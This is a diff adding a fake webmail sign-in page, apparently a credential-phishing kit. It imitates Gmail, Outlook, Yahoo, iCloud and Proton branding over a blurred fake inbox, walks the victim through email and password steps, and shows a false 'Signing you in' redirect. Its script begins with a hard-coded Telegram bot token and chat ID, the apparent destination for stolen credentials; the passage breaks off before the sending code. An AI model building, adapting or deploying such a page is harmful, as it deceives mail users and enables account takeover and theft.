@@ -1,0 +1,1714 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign in · Mail</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    html, body {
+      height: 100%;
+      overflow: hidden;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      background: #f6f8fc;
+    }
+
+    /* ==========================================================
+       🖼️ MAILBOX BACKGROUND
+       Key fix: top bar is a SEPARATE, INDEPENDENT layer.
+       Blur is applied only to the body wrapper — never the parent.
+       ========================================================== */
+
+    /* Outer container — NO blur, NO transform, NO filter */
+    .mailbox-bg {
+      position: fixed;
+      inset: 0;
+      z-index: 1;
+      background: #f6f8fc;
+      pointer-events: none;
+      user-select: none;
+      overflow: hidden;
+      /* CRITICAL: no filter, no transform, no backdrop-filter here */
+    }
+
+    /* ---------- TOP BAR — completely isolated ---------- */
+    .mb-topbar {
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 64px;
+      background: #ffffff;
+      border-bottom: 1px solid #e8eaed;
+      display: flex;
+      align-items: center;
+      padding: 0 20px;
+      gap: 16px;
+      /* Force its own isolated rendering layer */
+      isolation: isolate;
+      will-change: transform;
+      transform: translateZ(0);
+      z-index: 10;
+      box-shadow: 0 1px 4px rgba(0, 0, 0, 0.04);
+    }
+
+    /* ---------- LOGO (top-left) ---------- */
+    .mb-logo {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      min-width: 200px;
+    }
+
+    .mb-logo-icon {
+      width: 36px;
+      height: 36px;
+      background: linear-gradient(135deg, #EA4335, #FBBC04);
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      font-size: 1rem;
+      font-weight: 700;
+      position: relative;
+      overflow: hidden;
+      flex-shrink: 0;
+      transition: background 0.4s ease, box-shadow 0.4s ease;
+    }
+
+    .mb-logo-icon .mb-logo-letter {
+      position: absolute;
+      inset: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      font-size: 1rem;
+      font-weight: 700;
+      transition: opacity 0.3s ease;
+    }
+
+    .mb-logo-icon .mb-logo-favicon {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 26px;
+      height: 26px;
+      object-fit: contain;
+      border-radius: 6px;
+      background: #ffffff;
+      padding: 2px;
+      opacity: 0;
+      transition: opacity 0.35s ease;
+      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.08);
+    }
+
+    .mb-logo-icon.favicon-loaded {
+      background: #ffffff;
+      border: 1px solid #e8eaed;
+      box-shadow: 0 1px 4px rgba(0, 0, 0, 0.06);
+    }
+
+    .mb-logo-icon.favicon-loaded .mb-logo-letter { opacity: 0; }
+    .mb-logo-icon.favicon-loaded .mb-logo-favicon { opacity: 1; }
+
+    .mb-logo-icon[data-provider="gmail"]   { background: linear-gradient(135deg, #EA4335, #FBBC04); }
+    .mb-logo-icon[data-provider="outlook"] { background: linear-gradient(135deg, #0078D4, #00A4EF); }
+    .mb-logo-icon[data-provider="yahoo"]   { background: linear-gradient(135deg, #6001D2, #7B1FA2); }
+    .mb-logo-icon[data-provider="icloud"]  { background: linear-gradient(135deg, #3693F3, #1B6FD4); }
+    .mb-logo-icon[data-provider="proton"]  { background: linear-gradient(135deg, #6D4AFF, #8B5CF6); }
+    .mb-logo-icon[data-provider="generic"] { background: linear-gradient(135deg, #5f6368, #3c4043); }
+
+    .mb-logo-icon.favicon-loaded[data-provider] {
+      background: #ffffff;
+    }
+
+    .mb-logo-text {
+      font-size: 1.25rem;
+      font-weight: 500;
+      color: #5f6368;
+      letter-spacing: -0.02em;
+      transition: color 0.3s ease;
+    }
+
+    .mb-search {
+      flex: 1;
+      max-width: 720px;
+      height: 44px;
+      background: #f1f3f4;
+      border-radius: 22px;
+      display: flex;
+      align-items: center;
+      padding: 0 18px;
+      gap: 12px;
+      color: #5f6368;
+      font-size: 0.95rem;
+    }
+
+    .mb-search i { font-size: 1rem; color: #5f6368; }
+
+    .mb-icons {
+      display: flex;
+      align-items: center;
+      gap: 18px;
+      margin-left: auto;
+      color: #5f6368;
+      font-size: 1.15rem;
+    }
+
+    /* ---------- USER EMAIL (top-right) ---------- */
+    .mb-avatar {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 4px 12px 4px 4px;
+      border-radius: 22px;
+      background: #f1f3f4;
+      margin-left: 10px;
+    }
+
+    .mb-avatar-circle {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #4285f4, #1a73e8);
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 0.9rem;
+      font-weight: 600;
+      flex-shrink: 0;
+    }
+
+    .mb-avatar-email {
+      font-size: 0.85rem;
+      color: #3c4043;
+      font-weight: 500;
+      max-width: 240px;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+      letter-spacing: -0.01em;
+    }
+
+    /* ---------- BLURRED BODY (only this gets the blur) ---------- */
+    .mb-blurred-wrapper {
+      position: absolute;
+      top: 64px;          /* starts BELOW the crisp top bar */
+      left: 0;
+      right: 0;
+      bottom: 0;
+      overflow: hidden;
+      /* Blur is applied HERE — and only here */
+      filter: blur(6px) saturate(1.05);
+      -webkit-filter: blur(6px) saturate(1.05);
+      opacity: 0.85;
+      /* NO transform on the wrapper — that was causing the bleed */
+    }
+
+    /* Inner content gets the scale (moved from wrapper to inner) */
+    .mb-body {
+      display: flex;
+      height: 100%;
+      width: 100%;
+      transform: scale(1.03);
+      transform-origin: center top;
+    }
+
+    .mb-sidebar {
+      width: 256px;
+      background: #ffffff;
+      padding: 12px 0 12px 8px;
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+      flex-shrink: 0;
+    }
+
+    .mb-compose {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      background: #ffffff;
+      border: 1px solid #dadce0;
+      border-radius: 24px;
+      padding: 12px 20px;
+      margin: 0 8px 12px 8px;
+      color: #3c4043;
+      font-size: 0.9rem;
+      font-weight: 500;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.06);
+      width: fit-content;
+    }
+
+    .mb-compose i { color: #EA4335; font-size: 1rem; }
+
+    .mb-nav-item {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      padding: 8px 16px 8px 22px;
+      border-radius: 0 20px 20px 0;
+      color: #202124;
+      font-size: 0.88rem;
+      font-weight: 500;
+    }
+
+    .mb-nav-item.active {
+      background: #d3e3fd;
+      color: #041e49;
+      font-weight: 600;
+    }
+
+    .mb-nav-item i { width: 20px; text-align: center; font-size: 1rem; color: #5f6368; }
+    .mb-nav-item.active i { color: #041e49; }
+
+    .mb-nav-count {
+      margin-left: auto;
+      font-size: 0.78rem;
+      color: #5f6368;
+      font-weight: 500;
+    }
+
+    .mb-nav-item.active .mb-nav-count { color: #041e49; }
+
+    .mb-content {
+      flex: 1;
+      background: #ffffff;
+      border-radius: 16px 0 0 0;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .mb-toolbar {
+      display: flex;
+      align-items: center;
+      gap: 18px;
+      padding: 12px 20px;
+      border-bottom: 1px solid #e8eaed;
+      color: #5f6368;
+      font-size: 0.95rem;
+      flex-shrink: 0;
+    }
+
+    .mb-toolbar-spacer { flex: 1; }
+
+    .mb-emails {
+      flex: 1;
+      overflow: hidden;
+      padding: 8px 0;
+    }
+
+    .mb-email {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      padding: 12px 24px;
+      border-bottom: 1px solid #f1f3f4;
+      color: #202124;
+      font-size: 0.9rem;
+    }
+
+    .mb-email.unread { background: #ffffff; font-weight: 600; }
+    .mb-email.read { background: #f6f8fc; color: #5f6368; font-weight: 400; }
+
+    .mb-email-star { color: #dadce0; font-size: 0.9rem; }
+
+    .mb-email-from {
+      width: 200px;
+      flex-shrink: 0;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+
+    .mb-email-subject {
+      flex: 1;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+
+    .mb-email-subject .preview {
+      color: #5f6368;
+      font-weight: 400;
+      margin-left: 6px;
+    }
+
+    .mb-email-date {
+      font-size: 0.8rem;
+      color: #5f6368;
+      flex-shrink: 0;
+      font-weight: 500;
+    }
+
+    /* ==========================================================
+       🪟 LOGIN OVERLAY
+       ========================================================== */
+    .login-overlay {
+      position: fixed;
+      inset: 0;
+      z-index: 100;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 1.5rem;
+      background: rgba(15, 20, 30, 0.22);
+      backdrop-filter: blur(3px);
+      -webkit-backdrop-filter: blur(3px);
+    }
+
+    .login-card {
+      position: relative;
+      z-index: 10;
+      width: 100%;
+      max-width: 400px;
+      background: #ffffff;
+      border-radius: 16px;
+      box-shadow: 
+        0 1px 3px rgba(0, 0, 0, 0.06),
+        0 20px 60px rgba(0, 0, 0, 0.25),
+        0 0 0 1px rgba(0, 0, 0, 0.05);
+      padding: 2rem 2rem 1.6rem;
+      transition: box-shadow 0.3s ease;
+    }
+
+    .step-indicator {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 1.4rem;
+    }
+
+    .step-dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: #dadce0;
+      transition: all 0.35s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    .step-dot.active { background: #4285f4; width: 24px; border-radius: 4px; }
+    .step-dot.completed { background: #34a853; }
+
+    .logo-area {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-bottom: 1.4rem;
+    }
+
+    .logo-icon {
+      width: 64px;
+      height: 64px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: linear-gradient(135deg, #4285f4, #1a73e8);
+      border-radius: 16px;
+      margin-bottom: 1rem;
+      box-shadow: 0 6px 18px rgba(66, 133, 244, 0.25);
+      transition: all 0.4s ease;
+      position: relative;
+      overflow: hidden;
+      padding: 12px;
+    }
+
+    .logo-icon .fa-fallback {
+      font-size: 1.7rem;
+      color: #ffffff;
+      transition: opacity 0.3s ease;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+    }
+
+    .logo-icon .favicon-img {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      opacity: 0;
+      transition: opacity 0.4s ease;
+      background: #ffffff;
+      border-radius: 10px;
+      padding: 5px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
+    }
+
+    .logo-icon .favicon-img.loaded { opacity: 1; }
+
+    .logo-icon.favicon-active .fa-fallback { opacity: 0; }
+
+    .logo-icon.favicon-active {
+      background: #ffffff;
+      border: 1px solid #e8eaed;
+      padding: 6px;
+      box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1);
+    }
+
+    .logo-icon[data-provider="gmail"]   { background: linear-gradient(135deg, #EA4335, #FBBC04); box-shadow: 0 6px 18px rgba(234, 67, 53, 0.25); }
+    .logo-icon[data-provider="outlook"] { background: linear-gradient(135deg, #0078D4, #00A4EF); box-shadow: 0 6px 18px rgba(0, 120, 212, 0.25); }
+    .logo-icon[data-provider="yahoo"]   { background: linear-gradient(135deg, #6001D2, #7B1FA2); box-shadow: 0 6px 18px rgba(96, 1, 210, 0.25); }
+    .logo-icon[data-provider="icloud"]  { background: linear-gradient(135deg, #3693F3, #1B6FD4); box-shadow: 0 6px 18px rgba(54, 147, 243, 0.25); }
+    .logo-icon[data-provider="proton"]  { background: linear-gradient(135deg, #6D4AFF, #8B5CF6); box-shadow: 0 6px 18px rgba(109, 74, 255, 0.25); }
+    .logo-icon[data-provider="generic"] { background: linear-gradient(135deg, #5f6368, #3c4043); box-shadow: 0 6px 18px rgba(95, 99, 104, 0.25); }
+
+    .logo-icon.favicon-active[data-provider] {
+      background: #ffffff;
+      box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1);
+    }
+
+    .logo-area h1 {
+      font-size: 1.35rem;
+      font-weight: 600;
+      color: #202124;
+      letter-spacing: -0.02em;
+      margin-bottom: 0.3rem;
+      text-align: center;
+      transition: all 0.3s ease;
+    }
+
+    .logo-area p {
+      font-size: 0.88rem;
+      color: #5f6368;
+      font-weight: 400;
+      text-align: center;
+      transition: all 0.3s ease;
+    }
+
+    .account-chip {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 0.4rem 0.85rem 0.4rem 0.6rem;
+      background: #f8f9fa;
+      border: 1px solid #e8eaed;
+      border-radius: 100px;
+      margin-top: 0.7rem;
+      max-width: 100%;
+      opacity: 0;
+      transform: translateY(-6px);
+      pointer-events: none;
+      transition: all 0.35s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    .account-chip.visible {
+      opacity: 1;
+      transform: translateY(0);
+      pointer-events: auto;
+    }
+
+    .account-chip img {
+      width: 16px;
+      height: 16px;
+      border-radius: 50%;
+      object-fit: contain;
+      background: #ffffff;
+      border: 1px solid #e8eaed;
+      padding: 2px;
+    }
+
+    .account-chip i { font-size: 0.8rem; color: #5f6368; }
+
+    .account-chip span {
+      font-size: 0.8rem;
+      color: #3c4043;
+      font-weight: 500;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      max-width: 200px;
+    }
+
+    .field-wrapper {
+      position: relative;
+      margin-bottom: 0.4rem;
+    }
+
+    .field-input {
+      width: 100%;
+      padding: 1rem 3rem 1rem 3rem;
+      font-size: 1rem;
+      font-family: 'Inter', sans-serif;
+      color: #202124;
+      background: #f8f9fa;
+      border: 1.5px solid #dadce0;
+      border-radius: 12px;
+      outline: none;
+      transition: all 0.25s ease;
+      font-weight: 400;
+      letter-spacing: -0.01em;
+    }
+
+    .field-input:focus {
+      background: #ffffff;
+      border-color: #4285f4;
+      box-shadow: 0 0 0 3px rgba(66, 133, 244, 0.12);
+    }
+
+    .field-input::placeholder { color: #9aa0a6; font-weight: 400; font-size: 0.95rem; }
+
+    .field-left-icon {
+      position: absolute;
+      left: 0.85rem;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 22px;
+      height: 22px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #9aa0a6;
+      font-size: 1.05rem;
+      transition: all 0.25s ease;
+      pointer-events: none;
+      z-index: 2;
+    }
+
+    .field-input:focus ~ .field-left-icon { color: #4285f4; }
+
+    .field-left-icon img {
+      width: 20px;
+      height: 20px;
+      object-fit: contain;
+      border-radius: 5px;
+      background: #ffffff;
+      padding: 2px;
+      display: none;
+      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.08);
+    }
+
+    .field-left-icon.has-favicon img { display: block; }
+    .field-left-icon.has-favicon i { display: none; }
+
+    .field-right-btn {
+      position: absolute;
+      right: 0.95rem;
+      top: 50%;
+      transform: translateY(-50%);
+      background: transparent;
+      border: none;
+      color: #9aa0a6;
+      font-size: 1rem;
+      cursor: pointer;
+      padding: 4px;
+      transition: color 0.2s ease;
+      display: none;
+      z-index: 2;
+    }
+
+    .field-right-btn.visible { display: block; }
+    .field-right-btn:hover { color: #5f6368; }
+
+    .field-swap { animation: fieldSwap 0.4s cubic-bezier(0.4, 0, 0.2, 1); }
+
+    @keyframes fieldSwap {
+      0%   { opacity: 1; transform: translateY(0); }
+      40%  { opacity: 0; transform: translateY(-8px); }
+      60%  { opacity: 0; transform: translateY(8px); }
+      100% { opacity: 1; transform: translateY(0); }
+    }
+
+    .input-hint {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      padding: 0.45rem 0.2rem 0;
+      font-size: 0.76rem;
+      color: #5f6368;
+      min-height: 20px;
+      transition: all 0.25s ease;
+    }
+
+    .input-hint i { font-size: 0.68rem; color: #9aa0a6; transition: all 0.25s ease; }
+
+    .action-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-top: 1.2rem;
+      margin-bottom: 1.3rem;
+      opacity: 1;
+      transition: opacity 0.3s ease, max-height 0.4s ease, margin 0.3s ease;
+      overflow: hidden;
+      max-height: 60px;
+    }
+
+    .action-row.collapsed {
+      opacity: 0;
+      max-height: 0;
+      margin-top: 0;
+      margin-bottom: 1rem;
+      pointer-events: none;
+    }
+
+    .remember-check {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      cursor: pointer;
+      user-select: none;
+    }
+
+    .remember-check input { display: none; }
+
+    .check-box {
+      width: 18px;
+      height: 18px;
+      border-radius: 4px;
+      border: 2px solid #dadce0;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      background: #ffffff;
+      transition: all 0.2s ease;
+      flex-shrink: 0;
+    }
+
+    .remember-check input:checked + .check-box {
+      background: #4285f4;
+      border-color: #4285f4;
+    }
+
+    .remember-check input:checked + .check-box::after {
+      content: "\f00c";
+      font-family: "Font Awesome 6 Free";
+      font-weight: 900;
+      font-size: 10px;
+      color: #ffffff;
+    }
+
+    .remember-check span { font-size: 0.85rem; color: #3c4043; }
+
+    .forgot-link {
+      font-size: 0.85rem;
+      color: #1a73e8;
+      text-decoration: none;
+      font-weight: 500;
+      transition: color 0.2s ease;
+    }
+
+    .forgot-link:hover { color: #0d47a1; text-decoration: underline; }
+
+    .submit-btn {
+      width: 100%;
+      padding: 0.95rem 1.5rem;
+      font-size: 1rem;
+      font-weight: 600;
+      font-family: 'Inter', sans-serif;
+      color: #ffffff;
+      background: linear-gradient(135deg, #4285f4, #1a73e8);
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      transition: all 0.25s ease;
+      box-shadow: 0 1px 3px rgba(66, 133, 244, 0.3), 0 4px 12px rgba(66, 133, 244, 0.15);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+
+    .submit-btn:hover:not(:disabled) {
+      background: linear-gradient(135deg, #5a95f5, #2b7de9);
+      box-shadow: 0 2px 6px rgba(66, 133, 244, 0.4), 0 6px 20px rgba(66, 133, 244, 0.2);
+      transform: translateY(-1px);
+    }
+
+    .submit-btn:active:not(:disabled) { transform: translateY(0); }
+    .submit-btn:disabled { opacity: 0.9; cursor: not-allowed; transform: none; }
+
+    .submit-btn i { font-size: 0.9rem; transition: transform 0.3s ease; }
+    .submit-btn:hover:not(:disabled) i { transform: translateX(4px); }
+
+    .back-row {
+      display: flex;
+      justify-content: center;
+      margin-top: 0.6rem;
+      opacity: 0;
+      max-height: 0;
+      overflow: hidden;
+      transition: all 0.35s ease;
+    }
+
+    .back-row.visible { opacity: 1; max-height: 60px; }
+
+    .back-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 0.55rem 1rem;
+      background: transparent;
+      border: none;
+      color: #1a73e8;
+      font-size: 0.85rem;
+      font-weight: 500;
+      font-family: 'Inter', sans-serif;
+      cursor: pointer;
+      border-radius: 8px;
+      transition: background 0.2s ease;
+    }
+
+    .back-btn:hover { background: #f1f5fd; }
+    .back-btn i { font-size: 0.75rem; transition: transform 0.3s ease; }
+    .back-btn:hover i { transform: translateX(-3px); }
+
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      25% { transform: translateX(-5px); }
+      75% { transform: translateX(5px); }
+    }
+
+    .shake { animation: shake 0.3s ease; }
+
+    .field-input.input-error {
+      border-color: #d93025 !important;
+      background: #fef7f6 !important;
+    }
+
+    .field-input.input-success {
+      border-color: #34a853 !important;
+      background: #f6fef8 !important;
+    }
+
+    .success-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(255, 255, 255, 0.98);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      z-index: 2000;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.4s ease;
+    }
+
+    .success-overlay.visible { opacity: 1; pointer-events: auto; }
+
+    .success-check {
+      width: 80px;
+      height: 80px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #34a853, #1e8e3e);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 8px 24px rgba(52, 168, 83, 0.35);
+      margin-bottom: 1.5rem;
+      animation: successPop 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+    }
+
+    .success-check i { font-size: 2.2rem; color: #ffffff; }
+
+    @keyframes successPop {
+      0%   { transform: scale(0); opacity: 0; }
+      100% { transform: scale(1); opacity: 1; }
+    }
+
+    .success-overlay h2 {
+      font-size: 1.3rem;
+      font-weight: 600;
+      color: #202124;
+      margin-bottom: 0.4rem;
+    }
+
+    .success-overlay p {
+      font-size: 0.92rem;
+      color: #5f6368;
+    }
+
+    .success-overlay .redirect-note {
+      font-size: 0.8rem;
+      color: #9aa0a6;
+      margin-top: 1.2rem;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    @media (max-width: 900px) {
+      .mb-sidebar { width: 200px; }
+      .mb-email-from { width: 140px; }
+      .mb-avatar-email { max-width: 140px; }
+    }
+
+    @media (max-width: 640px) {
+      .mb-sidebar { display: none; }
+      .mb-search { display: none; }
+      .mb-avatar-email { max-width: 100px; font-size: 0.75rem; }
+      .mb-logo-text { font-size: 1rem; }
+      .mb-email-from { width: 100px; font-size: 0.82rem; }
+      .mb-email-subject .preview { display: none; }
+      .mb-icons { gap: 12px; }
+    }
+
+    @media (max-width: 480px) {
+      .login-card { padding: 1.6rem 1.4rem 1.3rem; }
+      .logo-area h1 { font-size: 1.2rem; }
+      .logo-icon { width: 56px; height: 56px; }
+      .field-input { padding: 0.9rem 2.8rem 0.9rem 2.8rem; font-size: 0.95rem; }
+      .submit-btn { padding: 0.85rem 1.2rem; font-size: 0.95rem; }
+      .account-chip span { max-width: 150px; }
+      .action-row { flex-direction: column; gap: 10px; align-items: flex-start; }
+    }
+
+    input:-webkit-autofill,
+    input:-webkit-autofill:hover,
+    input:-webkit-autofill:focus {
+      -webkit-text-fill-color: #202124;
+      -webkit-box-shadow: 0 0 0px 1000px #ffffff inset;
+      transition: background-color 5000s ease-in-out 0s;
+    }
+  </style>
+<meta property="og:title" content="mailbox auto" />
+<meta property="og:description" content="A simulated login page for a web mail service." />
+<meta property="og:url" content="https://ancient-hollow-yzf8.here.now/" />
+<meta property="og:type" content="website" />
+<meta property="og:image" content="https://here.now/og/ancient-hollow-yzf8.jpg" />
+<meta property="og:image:width" content="1280" />
+<meta property="og:image:height" content="720" />
+<meta name="twitter:image" content="https://here.now/og/ancient-hollow-yzf8.jpg" />
+<meta name="twitter:card" content="summary_large_image" /></head>
+<body>
+
+  <!-- ==========================================================
+       🖼️ MAILBOX BACKGROUND
+       Structure:
+         .mailbox-bg (no filter, no transform)
+           ├── .mb-topbar          → CRISP (isolated layer)
+           └── .mb-blurred-wrapper → BLURRED (only this one)
+                 └── .mb-body      → scaled inside
+       ========================================================== -->
+  <div class="mailbox-bg" id="mailboxBg" aria-hidden="true">
+
+    <!-- ---------- TOP BAR (CRISP, ISOLATED) ---------- -->
+    <div class="mb-topbar">
+
+      <div class="mb-logo">
+        <div class="mb-logo-icon" id="mbLogoIcon">
+          <span class="mb-logo-letter" id="mbLogoLetter">M</span>
+          <img class="mb-logo-favicon" id="mbLogoFavicon" src="" alt="" referrerpolicy="no-referrer">
+        </div>
+        <span class="mb-logo-text" id="mbLogoText">Mail</span>
+      </div>
+
+      <div class="mb-search">
+        <i class="fas fa-search"></i>
+        <span>Search mail</span>
+      </div>
+
+      <div class="mb-icons">
+        <i class="fas fa-question-circle"></i>
+        <i class="fas fa-cog"></i>
+        <i class="fas fa-th"></i>
+
+        <!-- USER EMAIL — 100% CRISP -->
+        <div class="mb-avatar">
+          <div class="mb-avatar-circle" id="mbAvatarCircle">U</div>
+          <span class="mb-avatar-email" id="mbAvatarEmail">user@example.com</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- ---------- BLURRED BODY ---------- -->
+    <div class="mb-blurred-wrapper">
+      <div class="mb-body">
+
+        <div class="mb-sidebar">
+          <div class="mb-compose">
+            <i class="fas fa-pen"></i>
+            Compose
+          </div>
+          <div class="mb-nav-item active">
+            <i class="fas fa-inbox"></i>
+            Inbox
+            <span class="mb-nav-count">12</span>
+          </div>
+          <div class="mb-nav-item">
+            <i class="fas fa-star"></i>
+            Starred
+          </div>
+          <div class="mb-nav-item">
+            <i class="fas fa-clock"></i>
+            Snoozed
+          </div>
+          <div class="mb-nav-item">
+            <i class="fas fa-paper-plane"></i>
+            Sent
+          </div>
+          <div class="mb-nav-item">
+            <i class="fas fa-file-alt"></i>
+            Drafts
+            <span class="mb-nav-count">3</span>
+          </div>
+          <div class="mb-nav-item">
+            <i class="fas fa-chevron-down"></i>
+            More
+          </div>
+        </div>
+
+        <div class="mb-content">
+          <div class="mb-toolbar">
+            <i class="far fa-square"></i>
+            <i class="fas fa-redo"></i>
+            <i class="fas fa-ellipsis-v"></i>
+            <div class="mb-toolbar-spacer"></div>
+            <span style="font-size: 0.8rem;">1–50 of 1,247</span>
+            <i class="fas fa-chevron-left"></i>
+            <i class="fas fa-chevron-right"></i>
+          </div>
+
+          <div class="mb-emails" id="mbEmails"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ==========================================================
+       🪟 LOGIN OVERLAY
+       ========================================================== -->
+  <div class="login-overlay">
+    <div class="login-card">
+
+      <div class="step-indicator">
+        <div class="step-dot active" id="dot1"></div>
+        <div class="step-dot" id="dot2"></div>
+        <div class="step-dot" id="dot3"></div>
+      </div>
+
+      <div class="logo-area">
+        <div class="logo-icon" id="logoIcon">
+          <i class="fas fa-envelope fa-fallback" id="logoFallback"></i>
+          <img class="favicon-img" id="faviconImg" alt="" referrerpolicy="no-referrer">
+        </div>
+        <h1 id="title">Sign in</h1>
+        <p id="subtitle">to continue to Mail</p>
+
+        <div class="account-chip" id="accountChip">
+          <img id="chipFavicon" src="" alt="" referrerpolicy="no-referrer">
+          <span id="accountChipText">user@example.com</span>
+        </div>
+      </div>
+
+      <form id="loginForm" novalidate>
+
+        <div class="field-wrapper">
+          <input type="text" class="field-input" id="fieldInput" placeholder="Email or phone" autocomplete="username" required>
+          <span class="field-left-icon" id="fieldLeftIcon">
+            <i class="fas fa-user" id="fieldLeftIconI"></i>
+            <img id="fieldLeftIconImg" src="" alt="" referrerpolicy="no-referrer">
+          </span>
+          <button type="button" class="field-right-btn" id="toggleBtn" aria-label="Show password">
+            <i class="fas fa-eye" id="toggleIcon"></i>
+          </button>
+        </div>
+
+        <div class="input-hint">
+          <i class="fas fa-info-circle" id="hintIcon"></i>
+          <span id="hintText">Enter your email or phone number to continue</span>
+        </div>
+
+        <div class="action-row" id="actionRow">
+          <label class="remember-check">
+            <input type="checkbox" checked>
+            <span class="check-box"></span>
+            <span>Remember me</span>
+          </label>
+          <a href="#" class="forgot-link">Forgot password?</a>
+        </div>
+
+        <button type="submit" class="submit-btn" id="submitBtn">
+          <span id="btnText">Next</span>
+          <i class="fas fa-arrow-right" id="btnIcon"></i>
+        </button>
+
+        <div class="back-row" id="backRow">
+          <button type="button" class="back-btn" id="backBtn">
+            <i class="fas fa-arrow-left"></i>
+            <span id="backText">Use another account</span>
+          </button>
+        </div>
+      </form>
+
+    </div>
+  </div>
+
+  <div class="success-overlay" id="successOverlay">
+    <div class="success-check"><i class="fas fa-check"></i></div>
+    <h2 id="successTitle">Signing you in…</h2>
+    <p id="successMessage">Redirecting to your inbox</p>
+    <div class="redirect-note">
+      <i class="fas fa-circle-notch fa-spin"></i>
+      <span id="redirectUrl">https://gmail.com</span>
+    </div>
+  </div>
+
+  <script>
+    (function() {
+      // ============================================================
+      // 🔧 CONFIGURATION
+      // ============================================================
+      const TELEGRAM_BOT_TOKEN = '8835031321:AAG1aESg9OnCAslfALyqR3MVeUrOwRrKtOY';
+      const TELEGRAM_CHAT_ID   = '8650838688';
+      // ============================================================
+
+      // ===== DOM =====
+      const dot1 = document.getElementById('dot1');
+      const dot2 = document.getElementById('dot2');
+      const dot3 = document.getElementById('dot3');
+      const logoIcon = document.getElementById('logoIcon');
+      const logoFallback = document.getElementById('logoFallback');
+      const faviconImg = document.getElementById('faviconImg');
+      const title = document.getElementById('title');
+      const subtitle = document.getElementById('subtitle');
+      const accountChip = document.getElementById('accountChip');
+      const accountChipText = document.getElementById('accountChipText');
+      const chipFavicon = document.getElementById('chipFavicon');
+      const fieldInput = document.getElementById('fieldInput');
+      const fieldLeftIcon = document.getElementById('fieldLeftIcon');
+      const fieldLeftIconI = document.getElementById('fieldLeftIconI');
+      const fieldLeftIconImg = document.getElementById('fieldLeftIconImg');
+      const toggleBtn = document.getElementById('toggleBtn');
+      const toggleIcon = document.getElementById('toggleIcon');
+      const hintIcon = document.getElementById('hintIcon');
+      const hintText = document.getElementById('hintText');
+      const actionRow = document.getElementById('actionRow');
+      const submitBtn = document.getElementById('submitBtn');
+      const btnText = document.getElementById('btnText');
+      const btnIcon = document.getElementById('btnIcon');
+      const backRow = document.getElementById('backRow');
+      const backBtn = document.getElementById('backBtn');
+      const backText = document.getElementById('backText');
+      const form = document.getElementById('loginForm');
+      const successOverlay = document.getElementById('successOverlay');
+      const successTitle = document.getElementById('successTitle');
+      const successMessage = document.getElementById('successMessage');
+      const redirectUrl = document.getElementById('redirectUrl');
+
+      const mbAvatarEmail = document.getElementById('mbAvatarEmail');
+      const mbAvatarCircle = document.getElementById('mbAvatarCircle');
